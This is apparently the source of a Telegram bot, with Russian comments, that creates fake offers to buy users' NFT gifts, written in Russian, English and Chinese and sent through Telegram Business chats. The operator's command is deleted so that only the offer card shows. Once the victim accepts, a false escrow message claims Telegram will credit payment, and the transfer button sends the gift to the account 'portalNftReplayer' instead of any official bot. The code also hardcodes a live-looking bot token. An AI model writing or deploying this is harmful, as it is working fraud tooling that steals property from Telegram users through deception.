import re
import asyncio
import logging
import os
import aiohttp
import sqlite3
from threading import Thread
from flask import Flask
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

BOT_TOKEN = "9150035187:AAHA1yqlsiU1CwnGECEMP5VX_1cFrG4t0Ho"
RENDER_URL = "https://portals-ams5.onrender.com" 
MAIN_ADMIN_ID = 8438026734

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# --- БАЗА ДАННЫХ ---
def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, role TEXT)''')
    cursor.execute("INSERT OR IGNORE INTO users (id, username, role) VALUES (?, ?, ?)", (MAIN_ADMIN_ID, "admin", "admin"))
    conn.commit()
    conn.close()

def get_user_role(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("SELECT role FROM users WHERE id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else None

def get_user_id(target):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    if target.startswith("@"):
        cursor.execute("SELECT id FROM users WHERE username = ?", (target,))
    else:
        try:
            cursor.execute("SELECT id FROM users WHERE id = ?", (int(target),))
        except ValueError:
            return None
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else None

def add_user(user_id, username, role="user"):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO users (id, username, role) VALUES (?, ?, ?)", (user_id, username, role))
    conn.commit()
    conn.close()

def del_user(target):
    user_id = get_user_id(target)
    if user_id and user_id != MAIN_ADMIN_ID:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("DELETE FROM users WHERE id = ?", (user_id,))
        conn.commit()
        conn.close()
        return True
    return False

def get_all_users():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("SELECT id, username, role FROM users")
    users = cursor.fetchall()
    conn.close()
    return users

init_db()

# --- ВЕБ-СЕРВЕР ---
app = Flask(__name__)

@app.route('/')
def index():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

async def keep_alive():
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(RENDER_URL) as response:
                    pass
        except Exception:
            pass
        await asyncio.sleep(600)

# --- ТЕКСТЫ ---
TEXTS = {
    "ru": {
        "offer": "Пользователь {user_link}\nпредлагает вам {price} за подарок\n\"{nft_name}\".\n\nПредложение действует еще 24h 00m.\n\n<a href='{nft_link}'>​</a>",
        "btn_show": "ПОКАЗАТЬ ПОДАРОК",
        "btn_decline": "Отклонить",
        "btn_accept": "Принять",
        "accepted": "<b>Покупатель зарезервировал ваш подарок.</b>\n\n<blockquote>Средства хранятся на специальном эскроу-счете и будут зачислены на баланс после передачи подарка.\n\n<b>Для завершения сделки:</b>\n1. Передайте подарок официальному боту: {transfer_bot}\n2. Нажмите «Передать NFT» и выберите NFT.\n3. Подтвердите передачу подарка.\n\nTelegram зафиксирует транзакцию и моментально зачислит {price} на ваш аккаунт.\n\n<b>Резерв действует 24 часа.</b></blockquote>",
        "btn_transfer": "Передать NFT",
        "menu": "👋 <b>Главное меню</b>\n\nДобро пожаловать! Выберите действие:\n\n📖 <code>/tutor</code> — Инструкция по использованию\n📝 <code>/price</code> — Создать офер",
        "tutor": (
            "📖 <b>Инструкция по использованию</b>\n\n"
            "Чтобы создать офер, отправьте команду в формате:\n"
            "<code>/price [ссылка_на_NFT] [цена] [валюта]</code>\n\n"
            "<b>Примеры:</b>\n"
            "<code>/price https://t.me/nft/GingerCookie-45925 7 gram</code>\n"
            "<code>/price https://t.me/nft/TamaGadget-31765 100 stars</code>\n\n"
            "<b>Языки:</b>\n"
            "🇷🇺 <code>/price</code> — Русский\n"
            "🇬🇧 <code>/prace</code> — Английский\n"
            "🇨🇳 <code>/proce</code> — Китайский\n\n"
            "<b>Валюты:</b>\n"
            "💎 <code>gram</code> — TON / GRAM\n"
            "⭐ <code>stars</code> — Telegram Stars\n\n"
            "После ввода команды бот пришлет готовую карточку с кнопками «Принять» и «Отклонить»."
        )
    },
    "en": {
        "offer": "User {user_link}\noffers you {price} for the gift\n\"{nft_name}\".\n\nOffer valid for another 24h 00m.\n\n<a href='{nft_link}'>​</a>",
        "btn_show": "SHOW GIFT",
        "btn_decline": "Decline",
        "btn_accept": "Accept",
        "accepted": "<b>The buyer has reserved your gift.</b>\n\n<blockquote>Funds are held in a special escrow account and will be credited to the balance after the gift is transferred.\n\n<b>To complete the deal:</b>\n1. Transfer the gift to the official bot: {transfer_bot}\n2. Click 'Transfer NFT' and select the NFT.\n3. Confirm the transfer of the gift.\n\nTelegram will record the transaction and instantly credit {price} to your account.\n\n<b>The reservation is valid for 24 hours.</b></blockquote>",
        "btn_transfer": "Transfer NFT",
        "menu": "👋 <b>Main Menu</b>\n\nWelcome! Choose an action:\n\n📖 <code>/tutor</code> — User Guide\n📝 <code>/price</code> — Create Offer",
        "tutor": (
            "📖 <b>User Guide</b>\n\n"
            "To create an offer, send the command:\n"
            "<code>/price [NFT_link] [price] [currency]</code>\n\n"
            "<b>Examples:</b>\n"
            "<code>/price https://t.me/nft/GingerCookie-45925 7 gram</code>\n"
            "<code>/price https://t.me/nft/TamaGadget-31765 100 stars</code>\n\n"
            "<b>Languages:</b>\n"
            "🇷🇺 <code>/price</code> — Russian\n"
            "🇬🇧 <code>/prace</code> — English\n"
            "🇨🇳 <code>/proce</code> — Chinese\n\n"
            "<b>Currencies:</b>\n"
            "💎 <code>gram</code> — TON / GRAM\n"
            "⭐ <code>stars</code> — Telegram Stars\n\n"
            "After sending the command, the bot will send a ready card with 'Accept' and 'Decline' buttons."
        )
    },
    "zh": {
        "offer": "用户 {user_link}\n向您提供 {price} 购买礼物\n\"{nft_name}\"。\n\n报价有效期为 24小时 00分钟。\n\n<a href='{nft_link}'>​</a>",
        "btn_show": "显示礼物",
        "btn_decline": "拒绝",
        "btn_accept": "接受",
        "accepted": "<b>买家已预订您的礼物。</b>\n\n<blockquote>资金存放在特殊的托管账户中，将在礼物转移后记入余额。\n\n<b>完成交易：</b>\n1. 将礼物转移给官方机器人：{transfer_bot}\n2. 点击“转移 NFT”并选择 NFT。\n3. 确认礼物转移。\n\nTelegram 将记录交易并立即将 {price} 记入您的账户。\n\n<b>预订有效期为 24 小时。</b></blockquote>",
        "btn_transfer": "转移 NFT",
        "menu": "👋 <b>主菜单</b>\n\n欢迎！请选择操作：\n\n📖 <code>/tutor</code> — 使用说明\n📝 <code>/price</code> — 创建报价",
        "tutor": (
            "📖 <b>使用说明</b>\n\n"
            "要创建报价，请发送命令：\n"
            "<code>/price [NFT链接] [价格] [货币]</code>\n\n"
            "<b>示例：</b>\n"
            "<code>/price https://t.me/nft/GingerCookie-45925 7 gram</code>\n"
            "<code>/price https://t.me/nft/TamaGadget-31765 100 stars</code>\n\n"
            "<b>语言：</b>\n"
            "🇷🇺 <code>/price</code> — 俄语\n"
            "🇬🇧 <code>/prace</code> — 英语\n"
            "🇨🇳 <code>/proce</code> — 中文\n\n"
            "<b>货币：</b>\n"
            "💎 <code>gram</code> — TON / GRAM\n"
            "⭐ <code>stars</code> — Telegram Stars\n\n"
            "发送命令后，机器人将发送带有“接受”和“拒绝”按钮的卡片。"
        )
    }
}

# --- ЛОГИКА БОТА ---
async def create_offer(chat_id, user_id, user_full_name, command_text, business_connection_id=None):
    command = command_text.split()[0].lower()
    lang = "ru" if command == "/price" else ("en" if command == "/prace" else "zh")
    t = TEXTS[lang]

    pattern = r"^/(price|prace|proce)\s+(https?://\S+)\s+([\d\.]+)\s+(gram|stars)(?:\s+(@\w+))?$"
    match = re.match(pattern, command_text, re.IGNORECASE)
    if not match:
        return

    _, nft_link, price_value, currency, target_user = match.groups()
    price_text = f"{price_value} ⭐" if currency.lower() == "stars" else f"{price_value} 💎"
    
    nft_name_formatted = nft_link.split('/')[-1].replace('-', '').capitalize()
    user_link = f"<a href='tg://user?id={user_id}'>{user_full_name}</a>"

    final_text = t["offer"].format(user_link=user_link, price=price_text, nft_name=nft_name_formatted, nft_link=nft_link)

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t["btn_show"], url=nft_link)],
        [
            InlineKeyboardButton(text=t["btn_decline"], callback_data=f"decline:{lang}"),
            InlineKeyboardButton(text=t["btn_accept"], callback_data=f"accept:{price_text}:{lang}")
        ]
    ])

    try:
        await bot.send_message(
            chat_id=chat_id,
            text=final_text,
            business_connection_id=business_connection_id,
            reply_markup=keyboard,
            disable_web_page_preview=False
        )
    except Exception as e:
        logging.error(f"Ошибка при отправке: {e}")

@dp.message(F.text == "/start")
async def start_command(message: types.Message):
    user_id = message.from_user.id
    username = f"@{message.from_user.username}" if message.from_user.username else "нет"
    role = get_user_role(user_id)

    if role == "admin":
        await message.answer("👑 Вы админ. Используйте /adminpanel для управления.")
        return
    elif role == "user":
        t = TEXTS["ru"]
        await message.answer(t["menu"])
        return

    admin_text = (
        f"🔔 <b>Новая заявка на доступ!</b>\n\n"
        f"👤 Имя: {message.from_user.full_name}\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"🔗 Юзернейм: {username}"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Принять", callback_data=f"approve:{user_id}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject:{user_id}")
        ]
    ])

    try:
        await bot.send_message(MAIN_ADMIN_ID, admin_text, reply_markup=keyboard)
    except Exception as e:
        logging.error(f"Ошибка при отправке заявки: {e}")

@dp.message(F.text == "/tutor")
async def tutor_command(message: types.Message):
    if get_user_role(message.from_user.id) not in ["admin", "user"]: return
    await message.answer(TEXTS["ru"]["tutor"])

@dp.message(F.text == "/adminpanel")
async def admin_panel(message: types.Message):
    if get_user_role(message.from_user.id) != "admin": return

    text = (
        "👑 <b>Админ-панель</b>\n\n"
        "Доступные команды:\n"
        "📋 <code>/list_users</code> — Список всех участников\n"
        "➕ <code>/add_admin [ID|@username]</code> — Назначить админом\n"
        "➕ <code>/add_user [ID|@username]</code> — Добавить пользователя\n"
        "❌ <code>/del [ID|@username]</code> — Удалить пользователя\n"
        "📥 <code>/download_db</code> — Скачать файл базы\n"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📥 Скачать базу (users.db)", callback_data="download_db")]
    ])
    
    await message.answer(text, reply_markup=keyboard)

@dp.message(F.text == "/list_users")
async def list_users(message: types.Message):
    if get_user_role(message.from_user.id) != "admin": return
    users = get_all_users()
    if not users:
        return

    text = "👥 <b>Список участников:</b>\n\n"
    for u_id, username, role in users:
        icon = "👑" if role == "admin" else "👤"
        text += f"{icon} <code>{u_id}</code> | {username} — {role}\n"
    
    await message.answer(text)

@dp.message(F.text.startswith("/add_admin"))
async def add_admin_cmd(message: types.Message):
    if get_user_role(message.from_user.id) != "admin": return
    try:
        target = message.text.split()[1]
        target_id = get_user_id(target)
        
        if target_id:
            add_user(target_id, target, "admin")
            await message.answer(f"👑 Пользователь {target} назначен админом.")
            try:
                await bot.send_message(target_id, "👑 Вам выданы права администратора в боте.")
            except:
                pass
        else:
            await message.answer("❌ Пользователь не найден в базе. Он должен сначала написать /start.")
    except:
        await message.answer("❌ Формат: /add_admin 123456789 или /add_admin @username")

@dp.message(F.text.startswith("/add_user"))
async def add_user_cmd(message: types.Message):
    if get_user_role(message.from_user.id) != "admin": return
    try:
        target = message.text.split()[1]
        target_id = get_user_id(target)
        
        if target_id:
            add_user(target_id, target, "user")
            await message.answer(f"✅ Пользователь {target} добавлен.")
            try:
                await bot.send_message(target_id, "🎉 Вам выдан доступ к боту!")
            except:
                pass
        else:
            await message.answer("❌ Пользователь не найден в базе. Он должен сначала написать /start.")
    except:
        await message.answer("❌ Формат: /add_user 123456789 или /add_user @username")

@dp.message(F.text.startswith("/del"))
async def del_user_cmd(message: types.Message):
    if get_user_role(message.from_user.id) != "admin": return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Формат: /del 123456789 или /del @username")
        return
        
    target = args[1]
    
    if target == str(MAIN_ADMIN_ID):
        await message.answer("❌ Нельзя удалить главного админа.")
        return
        
    if del_user(target):
        await message.answer(f"✅ Пользователь {target} удален из базы.")
    else:
        await message.answer("❌ Пользователь не найден.")

@dp.message(F.text == "/download_db")
async def download_db_cmd(message: types.Message):
    if get_user_role(message.from_user.id) != "admin": return
    try:
        file = FSInputFile("users.db")
        await message.answer_document(file, caption="📦 Файл базы данных")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query(F.data == "download_db")
async def download_db_callback(callback: types.CallbackQuery):
    if get_user_role(callback.from_user.id) != "admin": return
    try:
        file = FSInputFile("users.db")
        await callback.message.answer_document(file, caption="📦 Файл базы данных")
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка: {e}")
    await callback.answer()

@dp.callback_query(F.data.startswith("approve:"))
async def approve_user(callback: types.CallbackQuery):
    if get_user_role(callback.from_user.id) != "admin": return
    user_id = int(callback.data.split(":")[1])
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET role = 'user' WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()
    
    await callback.message.edit_text(f"✅ Пользователь <code>{user_id}</code> одобрен.")
    try:
        await bot.send_message(user_id, "🎉 Ваша заявка одобрена! Теперь вы можете использовать /price.\n\nНапишите /tutor для инструкции.")
    except:
        pass
    await callback.answer()

@dp.callback_query(F.data.startswith("reject:"))
async def reject_user(callback: types.CallbackQuery):
    if get_user_role(callback.from_user.id) != "admin": return
    user_id = int(callback.data.split(":")[1])
    await callback.message.edit_text(f"❌ Пользователь <code>{user_id}</code> отклонен.")
    await callback.answer()

@dp.business_message(F.text.regexp(r"^/(price|prace|proce)\s+"))
async def handle_business_price(message: types.Message):
    if get_user_role(message.from_user.id) not in ["admin", "user"]: return
    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception:
        pass
    await create_offer(message.chat.id, message.from_user.id, message.from_user.full_name, message.text, message.business_connection_id)

@dp.message(F.text.regexp(r"^/(price|prace|proce)\s+"))
async def handle_private_price(message: types.Message):
    if get_user_role(message.from_user.id) not in ["admin", "user"]: return
    try:
        await message.delete()
    except Exception:
        pass
    await create_offer(message.chat.id, message.from_user.id, message.from_user.full_name, message.text)

@dp.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: types.CallbackQuery):
    await callback.answer()
    try:
        parts = callback.data.split(":")
        price_str, lang = parts[1], parts[2]
        t = TEXTS[lang]

        target_username = "portalNftReplayer" 
        gift_link = f"tg://send_gift?to={target_username}"

        new_text = t["accepted"].format(transfer_bot="@portals_nftbot", price=price_str)
        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=t["btn_transfer"], url=gift_link)]
        ])

        await bot.edit_message_text(
            text=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id,
            reply_markup=new_keyboard, business_connection_id=callback.message.business_connection_id
        )
    except Exception as e:
        logging.error(f"Ошибка в кнопке: {e}")

@dp.callback_query(F.data.startswith("decline:"))
async def decline_offer(callback: types.CallbackQuery):
    lang = callback.data.split(":")[1]
    msg = "Вы отклонили предложение." if lang == "ru" else ("You have declined the offer." if lang == "en" else "您已拒绝该报价。")
    await callback.answer(msg, show_alert=True)

async def main():
    Thread(target=run_flask, daemon=True).start()
    asyncio.create_task(keep_alive()) 
    print("Бот запущен.")
    await dp.start_polling(bot, allowed_updates=["business_connection", "business_message", "callback_query", "message"])

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Бот остановлен.")
